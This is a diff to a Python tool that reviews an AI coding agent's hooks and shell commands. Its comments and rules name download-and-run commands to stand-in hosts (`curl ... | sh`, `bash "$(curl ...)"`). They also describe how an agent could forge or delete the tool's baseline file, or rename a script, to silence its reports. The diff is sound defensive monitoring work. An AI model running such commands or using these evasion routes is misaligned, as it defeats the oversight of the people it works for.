@@ -998,6 +998,17 @@ def post_hook_installed(root: Path) -> bool:
 # hook also records the registry problems before the command, and `hook-post` reports only the ones the
 # command introduced. What it cannot see is an install from a URL: the files and dependencies it leaves are
 # indistinguishable from shadcn's own components. Only a network-level barrier stops that one.
+# The baseline below is a plain file, written by one process and read by another, in a path the
+# agent's own shell command can compute. There is no fix for that by integrity: the hook runs as the
+# same user, from a file the command can read, so any key it could verify with is a key the command
+# could read too — an HMAC here would be theatre. What is left is to make forging it cost more than
+# one `echo`, and to say plainly what still gets through:
+#   - a baseline that is not exactly the JSON list this writes is NOT a clean one (see below);
+#   - deleting it reports every current problem, not none;
+#   - a command that names the baseline path is denied before it runs (hook_decision);
+#   - and `check` at the phase gate recomputes all of it from the project, where no temporary file
+#     can suppress anything. That gate, not this cache, is the control. This only moves the report
+#     earlier, so its failure mode must be noise, never silence.
 def _effect_snapshot(root: Path, payload: dict) -> Path:
     # Keyed on the project root, not the raw cwd: PostToolUse carries the cwd *after* the command, so a
     # `cd sub` inside it looked for another snapshot, found none, and the check said nothing.
@@ -1020,10 +1031,15 @@ def hook_post_report(payload: dict) -> str | None:
         return None
     path = _effect_snapshot(root, payload)
     try:
-        before: set[str] | None = set(json.loads(path.read_text()))
+        raw = json.loads(path.read_text())
+        # `set(json.loads(...))` accepted anything iterable: a forged `{"...": 1}` became a set of its
+        # keys, and a forged string became a set of its characters — both read as a baseline.
+        if not (isinstance(raw, list) and all(isinstance(x, str) for x in raw)):
+            raise ValueError("the baseline is not the list of strings this writes")
+        before: set[str] | None = set(raw)
         path.unlink(missing_ok=True)
-    except (OSError, json.JSONDecodeError):
-        before = None  # a missing baseline is not a clean one: deleting it must not hide what the command did
+    except (OSError, json.JSONDecodeError, ValueError):
+        before = None  # a missing or rewritten baseline is not a clean one: it must not hide what the command did
     now = registry_problems(root, lock)
     new = now if before is None else [p for p in now if p not in before]
     if not new:
@@ -1687,6 +1703,7 @@ HOOK_CODES = {
           "harness reads as *block*, so every matching call is refused",
     "H9": "a shell resolves this command and we cannot: what it runs was not reviewed",
     "H10": "the settings file does not parse — nothing in it was reviewed, and silence is not a pass",
+    "H11": "an interpreter is named and we could not say which file it runs — nothing was read",
 }
 
 # What the harness expands and `shlex` does not. A token still carrying any of these after our own
@@ -1697,6 +1714,14 @@ SHELL_SYNTAX = re.compile(r"[$`*?\[]")
 # shell syntax at all, so a per-token filter waves it through. When a command contains one, nothing
 # in it is a path we resolved.
 SUBSTITUTION = re.compile(r"\$\(|`")
+# An interpreter decides what a token IS. Finding scripts by extension alone meant
+# `python3 .claude/hooks/tool` resolved to nothing: no script was read, no finding was raised, and
+# the hook passed `check` — the body of a file that runs on every tool call, never opened. Renaming
+# a script was enough. A file is a script because something runs it, not because of its name.
+INTERPRETERS = SHELLS | set(INLINE_CODE)
+SCRIPT_EXT = re.compile(r"\.(?:py|mjs|cjs|js|ts|sh)$")
+# The code is on the command line, so there is no file to read; HOOK_RULES have judged the text.
+INLINE_FLAGS = {"-c", "--command", "-e", "--eval", "-p", "--print", "-r", "eval"}
 
 HOOK_RULES: list[tuple[str, str, re.Pattern]] = [
     ("H1", "block", re.compile(r"(?:curl|wget)[^|\n]{0,200}\|\s*(?:sudo\s+)?(?:sh|bash|zsh)")),
@@ -1739,7 +1764,7 @@ def hook_entries(root: Path) -> tuple[list[tuple[str, str, str]], list[tuple[str
     return out, unreadable
 
 
-def hook_scripts(root: Path, command: str) -> tuple[list[Path], list[tuple[str, bool]]]:
+def hook_scripts(root: Path, command: str) -> tuple[list[Path], list[tuple[str, str]]]:
     """EVERY file a hook runs, not the first.
 
     The first version returned one, so `python3 good.py && python3 evil.py` was reviewed by reading
@@ -1757,21 +1782,50 @@ def hook_scripts(root: Path, command: str) -> tuple[list[Path], list[tuple[str, 
     # `$HOME/bin/tool.sh` is ordinary and a reader can judge it; a command that COMPUTES what it
     # runs cannot be judged by anyone, so the pair carries which kind this is.
     if SUBSTITUTION.search(expanded):
-        return [], [(command.strip(), True)]
+        return [], [(command.strip(), "computed")]
     out: list[Path] = []
-    unresolved: list[tuple[str, bool]] = []
-    for token in tokens:
-        # `curl https://x.test/i.sh | sh` ends in `.sh` and is not a path. A URL is a URL.
-        if "://" in token:
-            continue
-        if not re.search(r"\.(?:py|mjs|cjs|js|ts|sh)$", token):
-            continue
+    unresolved: list[tuple[str, str]] = []
+    seen: set[str] = set()
+
+    def add(token: str) -> None:
         if SHELL_SYNTAX.search(token):
             # `$HOME/x.py`, `ev*.py`, `$(echo ev)il.py`: the shell resolves these and we do not.
             # Computing a path from the literal text invents a file, then reports it missing.
-            unresolved.append((token, False))
+            # One token reached by both passes below (an interpreter names it AND it ends in a
+            # script extension) is one finding, not two.
+            if token not in seen:
+                seen.add(token)
+                unresolved.append((token, "expansion"))
+            return
+        path = Path(token) if Path(token).is_absolute() else root / token
+        if path.as_posix() not in seen:
+            seen.add(path.as_posix())
+            out.append(path)
+
+    for i, token in enumerate(tokens):
+        if "://" in token or Path(token).name not in INTERPRETERS:
             continue
-        out.append(Path(token) if Path(token).is_absolute() else root / token)
+        rest = tokens[i + 1:]
+        if any(t in INLINE_FLAGS for t in rest[:3]):
+            continue
+        for cand in rest:
+            if "://" in cand:
+                break
+            if cand.startswith("-"):
+                continue
+            if Path(cand).name in INTERPRETERS:  # `env python3 x`: the next one decides
+                break
+            add(cand)
+            break
+        else:
+            # An interpreter with nothing we could resolve is not an inline command and not a
+            # reviewed script: it is a gap, and a gap says so rather than passing quietly.
+            unresolved.append((f"{token} — no file resolved in `{command.strip()[:80]}`", "no-script"))
+    for token in tokens:
+        # A script run directly, with no interpreter named: `./x.sh`, `.claude/hooks/x.py`.
+        # `curl https://x.test/i.sh | sh` ends in `.sh` and is not a path. A URL is a URL.
+        if "://" not in token and SCRIPT_EXT.search(token):
+            add(token)
     return out, unresolved
 
 
@@ -1788,12 +1842,16 @@ def review_hooks(root: Path) -> list[Finding]:
                 seen.add(code)
                 found.append(Finding(code, level, event, HOOK_CODES[code], command[:150]))
         scripts, unresolved = hook_scripts(root, command)
-        for token, computed in unresolved:
+        for token, kind in unresolved:
             # Making H9 uniformly `review` was a control regression: before it, an unresolvable
             # command produced an invented path and an H8 *block* — for the wrong reason, but it
             # blocked. `bash "$(curl -s https://host/w)"` then passed `check` with a tick, and no
             # other rule catches it: H1 needs a pipe. A command that computes what it runs is the
             # one shape nobody can review, so it blocks; an expansion a reader can follow does not.
+            if kind == "no-script":
+                found.append(Finding("H11", "review", event, HOOK_CODES["H11"], f"{where}: {token}"))
+                continue
+            computed = kind == "computed"
             found.append(Finding("H9", "block" if computed else "review", event,
                                  HOOK_CODES["H9"] + (" — and it computes that at run time" if computed else ""),
                                  f"{where}: {token}"))
@@ -1827,9 +1885,16 @@ def review_hooks(root: Path) -> list[Finding]:
                 found.append(Finding("H6", "review", event, HOOK_CODES["H6"],
                                      f"{where}: {HOOK_COPY} is not the installed skill — scanned as "
                                      "third-party; `setup` refreshes it"))
-            if AUTO_ALLOW.search(body) and not re.search(r'permissionDecision["\']?\s*[:=]\s*["\'](?:deny|ask)["\']', body):
-                found.append(Finding("H4", "block", event, HOOK_CODES["H4"],
-                                     f"{where}: {script.name} only ever decides `allow`"))
+            if AUTO_ALLOW.search(body):
+                # A `deny` ANYWHERE used to clear this finding: one such string — in a comment, a
+                # docstring, an unrelated branch, or a rule that merely names the word — turned a
+                # block into silence. A hook that can answer `allow` is read by a person either way;
+                # what the other decision changes is the level, not whether it is reported.
+                decides = re.search(r'permissionDecision["\']?\s*[:=]\s*["\'](?:deny|ask)["\']', body)
+                found.append(Finding("H4", "review" if decides else "block", event, HOOK_CODES["H4"],
+                                     f"{where}: {script.name} " + ("also decides `deny`/`ask` somewhere — read "
+                                      "which calls the `allow` covers" if decides
+                                      else "only ever decides `allow`")))
             # A pattern in a SCRIPT is text, not a proven call: a comment, a string, a rule that blocks
             # the very thing it names. The configured command is a command; a file is source. So the
             # body never blocks — it asks a person to read the line.
@@ -2442,6 +2507,12 @@ def hook_decision(payload: dict) -> str | None:
     command = (payload.get("tool_input") or {}).get("command") or ""
     if not isinstance(command, str):
         raise TypeError("tool_input.command is not a string")
+    if BASELINE_PATH.search(command):
+        return ("this command names registry intake's own before-state file. That file is how "
+                "`hook-post` tells a problem the command introduced from one that was already there, "
+                "so writing it decides what the next report is allowed to say. Nothing legitimate "
+                "needs it: if you are debugging the hook, run `registry_intake.py check <root>`, "
+                "which recomputes everything from the project.")
     for inv in mcp_installs(command):
         return (f"`{inv}` registers an MCP server — a process whose tools this agent may call, and "
                 "whose tool descriptions it reads as instructions. The user registers it; then "
@@ -2543,6 +2614,11 @@ def hook_ask(payload: dict) -> str | None:
         return None
     return ("registry intake: the agent wants to " + "; and to ".join(asks) +
             ". Confirm only if you said yes to this — the lock will say you did.")
+
+
+# `registry-intake-<16 hex>.json` under TMPDIR. Narrow on purpose: `registry-intake/` (the skill
+# directory) and `chore/registry-intake-hook` (a branch) are ordinary and must not be denied.
+BASELINE_PATH = re.compile(r"registry-intake-(?:[0-9a-f]{4,16}|[*?\[])")
 
 
 def may_install(command: str) -> bool:
